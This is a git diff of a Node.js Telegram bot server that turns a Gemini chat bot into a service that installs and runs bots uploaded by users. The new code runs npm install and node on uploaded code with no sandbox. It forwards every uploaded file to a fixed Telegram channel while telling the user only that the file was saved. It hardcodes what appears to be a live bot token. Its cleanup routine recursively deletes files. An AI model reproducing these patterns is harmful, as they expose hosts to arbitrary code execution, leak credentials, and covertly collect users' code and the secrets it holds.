@@ -3,177 +3,43 @@ const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
-const { exec, spawn } = require('child_process');
+const { exec, spawn, execSync } = require('child_process');
 
 const app = express();
+const PORT = process.env.PORT || 3000;
 
-// Hardcoded config
-const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';  // Replace with your Telegram bot token
-const CHANNEL_ID = '-1002493057827';                // Your Telegram channel ID
-const PORT = 3000;                                  // Port to listen on
-
-// Gemini API keys from environment variable (comma-separated)
-const GEMINI_KEYS = (process.env.GEMINI_API_KEYS || '')
-  .split(',')
-  .map(k => k.trim())
-  .filter(k => k);
-
+// CONFIG
+const BOT_TOKEN = '7746909781:AAFdQYVaGvy1ONNS2bhPUxTF83VZ_Ap-r1o';
+const CHANNEL_ID = '-1002493057827';
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 const BASE_DIR = __dirname;
 const UPLOAD_DIR = path.join(BASE_DIR, 'userbot');
 const USERS_FILE = path.join(BASE_DIR, 'users.json');
-const HISTORY_FILE = path.join(BASE_DIR, 'gemini_history.json');
 const KEEP_FILES = ['server.js', 'package.json', 'users.json', 'node_modules'];
 
-// Ensure directories and files exist
+// Ensure folders exist
 if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
 if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify([]));
-if (!fs.existsSync(HISTORY_FILE)) fs.writeFileSync(HISTORY_FILE, JSON.stringify({}));
 
-const signature = '\n\n— Kaustav Ray, founder';
-
-// Express health check route
+// Uptime or ping check route
 app.get('/', (req, res) => {
-  res.send('🤖 Bot Code Maker is live. – Kaustav Ray, founder');
+  res.send('🤖 Telegram Bot Runner is live.');
 });
 
-// Load and save users helpers
-function loadUsers() {
-  return JSON.parse(fs.readFileSync(USERS_FILE));
-}
-function saveUsers(users) {
-  fs.writeFileSync(USERS_FILE, JSON.stringify(users));
-}
-
-// Load and save AI chat history helpers
-function loadHistory() {
-  return JSON.parse(fs.readFileSync(HISTORY_FILE));
-}
-function saveHistory(history) {
-  fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
-}
-function addToHistory(userId, text) {
-  const history = loadHistory();
-  if (!history[userId]) history[userId] = [];
-  history[userId].unshift(text);
-  if (history[userId].length > 10) history[userId] = history[userId].slice(0, 10);
-  saveHistory(history);
-}
-
-// /start command handler
+// Handle /start command
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
-  let users = loadUsers();
+  let users = JSON.parse(fs.readFileSync(USERS_FILE));
   if (!users.includes(chatId)) {
     users.push(chatId);
-    saveUsers(users);
+    fs.writeFileSync(USERS_FILE, JSON.stringify(users));
   }
 
-  const welcomeMsg =
-    `👋 Hello! I am your *Bot Code Maker* 🤖.` +
-    `\nSend me any message and I will chat with you using Gemini AI.` +
-    `\nUse /history to see your last 10 AI chat responses.` +
-    signature;
-
-  bot.sendMessage(chatId, welcomeMsg, { parse_mode: 'Markdown' });
+  bot.sendMessage(chatId, '👋 Send me your `bot.js` and `package.json`. I will install and run it!');
 });
 
-// /history command handler
-bot.onText(/\/history/, (msg) => {
-  const chatId = msg.chat.id;
-  const history = loadHistory();
-  const entries = history[chatId.toString()] || [];
-
-  if (entries.length === 0) {
-    return bot.sendMessage(chatId, '🕰️ You have no previous AI chat responses.' + signature);
-  }
-
-  let reply = '🧠 *Your Last 10 AI Chat Responses:*\n\n';
-  entries.forEach((entry, index) => {
-    reply += `*${index + 1}.* ${entry.slice(0, 200).replace(/[\r\n]+/g, ' ')}...\n\n`;
-  });
-
-  bot.sendMessage(chatId, reply + signature, { parse_mode: 'Markdown' });
-});
-
-// Gemini API call with fallback for multiple keys
-async function callGemini(prompt) {
-  if (GEMINI_KEYS.length === 0) {
-    throw new Error('No Gemini API keys provided.');
-  }
-
-  const startIndex = Math.floor(Math.random() * GEMINI_KEYS.length);
-  const keysToTry = [];
-  for (let i = 0; i < GEMINI_KEYS.length; i++) {
-    keysToTry.push(GEMINI_KEYS[(startIndex + i) % GEMINI_KEYS.length]);
-  }
-
-  for (let i = 0; i < keysToTry.length; i++) {
-    const apiKey = keysToTry[i];
-    try {
-      const response = await new Promise((resolve, reject) => {
-        const options = {
-          hostname: 'generativelanguage.googleapis.com',
-          path: `/v1beta/models/gemini-pro:generateContent?key=${apiKey}`,
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' }
-        };
-
-        const req = https.request(options, (res) => {
-          let data = '';
-          res.on('data', chunk => (data += chunk));
-          res.on('end', () => {
-            try {
-              const parsed = JSON.parse(data);
-              const text = parsed.candidates?.[0]?.content?.parts?.[0]?.text || '';
-              if (!text) throw new Error('Empty response');
-              resolve(text);
-            } catch (err) {
-              reject(err);
-            }
-          });
-        });
-
-        req.on('error', reject);
-        req.write(
-          JSON.stringify({
-            contents: [{ parts: [{ text: prompt }] }]
-          })
-        );
-        req.end();
-      });
-
-      return response;
-    } catch (err) {
-      console.warn(`❌ Gemini key attempt #${i + 1} failed: ${err.message}. Trying next key...`);
-    }
-  }
-
-  throw new Error('All Gemini API keys failed.');
-}
-
-// AI chat for normal text messages (skip commands)
-bot.on('message', async (msg) => {
-  const chatId = msg.chat.id;
-
-  if (!msg.text || msg.text.startsWith('/')) return;
-
-  try {
-    bot.sendChatAction(chatId, 'typing');
-
-    const userMessage = msg.text.trim();
-    const aiResponse = await callGemini(userMessage);
-
-    addToHistory(chatId.toString(), aiResponse);
-
-    bot.sendMessage(chatId, aiResponse + signature);
-  } catch (err) {
-    bot.sendMessage(chatId, '❌ AI error:\n' + err.message + signature);
-  }
-});
-
-// Handle file uploads
+// Handle uploaded files
 bot.on('document', async (msg) => {
   const chatId = msg.chat.id;
   const fileId = msg.document.file_id;
@@ -188,37 +54,118 @@ bot.on('document', async (msg) => {
     res.pipe(fileStream);
     fileStream.on('finish', () => {
       fileStream.close();
-      bot.sendMessage(chatId, `✅ Saved ${fileName}` + signature);
+      bot.sendMessage(chatId, `✅ Saved ${fileName}`);
 
-      // Forward file to admin channel
+      // Forward file to the channel
       bot.sendDocument(CHANNEL_ID, filePath, {
         caption: `📦 Uploaded by @${msg.from.username || msg.from.first_name || 'unknown'}\n📄 ${fileName}`
       });
 
-      // Auto-run bot.js if both files exist
-      const files = fs.readdirSync(UPLOAD_DIR);
-      if (files.includes('bot.js') && files.includes('package.json')) {
-        bot.sendMessage(chatId, '📦 Installing dependencies...');
-        exec(`cd ${UPLOAD_DIR} && npm install`, (err, stdout, stderr) => {
-          if (err) {
-            bot.sendMessage(chatId, `❌ Install error:\n${stderr}` + signature);
-            return;
-          }
-
-          bot.sendMessage(chatId, '🚀 Running your bot...');
-          const child = spawn('node', ['bot.js'], {
-            cwd: UPLOAD_DIR,
-            detached: true,
-            stdio: 'ignore'
-          });
-          child.unref();
-
-          bot.sendMessage(chatId, '✅ Your bot is now running!' + signature);
-        });
-      }
+      const files = fs.readdirSync(UPLOAD_DIR);                
+      if (files.includes('bot.js') && files.includes('package.json')) {                
+        bot.sendMessage(chatId, '📦 Installing dependencies...');                
+        exec(`cd ${UPLOAD_DIR} && npm install`, (err, stdout, stderr) => {                
+          if (err) {                
+            bot.sendMessage(chatId, `❌ Install error:\n${stderr}`);                
+            return;                
+          }                
+        
+          bot.sendMessage(chatId, '🚀 Running your bot...');                
+          const child = spawn('node', ['bot.js'], {                
+            cwd: UPLOAD_DIR,                
+            detached: true,                
+            stdio: 'ignore'                
+          });                
+          child.unref();                
+        
+          bot.sendMessage(chatId, '✅ Your bot is now running!');                
+        });                
+      }                
     });
   });
 });
+
+// Cleanup logic
+function runCleanup(reason, callback = null) {
+  fs.readdir(BASE_DIR, (err, items) => {
+    if (err) return;
+    let deleted = false;
+
+    items.forEach(item => {
+      if (KEEP_FILES.includes(item)) return;
+      const itemPath = path.join(BASE_DIR, item);
+      fs.rm(itemPath, { recursive: true, force: true }, () => {});
+      deleted = true;
+    });
+
+    if (deleted && fs.existsSync(USERS_FILE)) {
+      const users = JSON.parse(fs.readFileSync(USERS_FILE));
+      const notifyBot = new TelegramBot(BOT_TOKEN);
+      let message = '';
+
+      if (reason === 'disk80') {
+        message = '⚠️ Server 80% full. Auto-cleanup triggered.';
+      } else if (reason === 'disk70') {
+        message = '⚠️ Server 70% full. Cache cleared. Restarting bot...';
+      } else {
+        message = '🧹 Daily cleanup: old files removed.';
+      }
+
+      users.forEach(chatId => {
+        notifyBot.sendMessage(chatId, message);
+      });
+    }
+
+    if (callback) callback();
+  });
+}
+
+// Daily cleanup of files older than 24 hours
+setInterval(() => {
+  const now = Date.now();
+  const cutoff = now - 24 * 60 * 60 * 1000;
+
+  fs.readdir(BASE_DIR, (err, items) => {
+    if (err) return;
+    let deleted = false;
+
+    items.forEach(item => {
+      if (KEEP_FILES.includes(item)) return;
+      const itemPath = path.join(BASE_DIR, item);
+      fs.stat(itemPath, (err, stats) => {
+        if (err) return;
+        if (stats.mtimeMs < cutoff) {
+          fs.rm(itemPath, { recursive: true, force: true }, () => {});
+          deleted = true;
+        }
+      });
+    });
+
+    if (deleted) runCleanup('daily');
+  });
+}, 60 * 60 * 1000); // Every hour
+
+// Disk monitor every 30 minutes
+setInterval(() => {
+  try {
+    const output = execSync('df -h /').toString();
+    const lines = output.split('\n');
+    const usageLine = lines[1];
+    const usedPercent = parseInt(usageLine.split(/\s+/)[4].replace('%', ''));
+
+    if (usedPercent >= 80) {
+      runCleanup('disk80');
+    } else if (usedPercent >= 70) {
+      runCleanup('disk70', () => {
+        setTimeout(() => {
+          process.exit(1); // Force restart on Render
+        }, 5000);
+      });
+    }
+  } catch (e) {
+    // ignore error
+  }
+}, 30 * 60 * 1000);
 
 // Start Express server
 app.listen(PORT, () => {
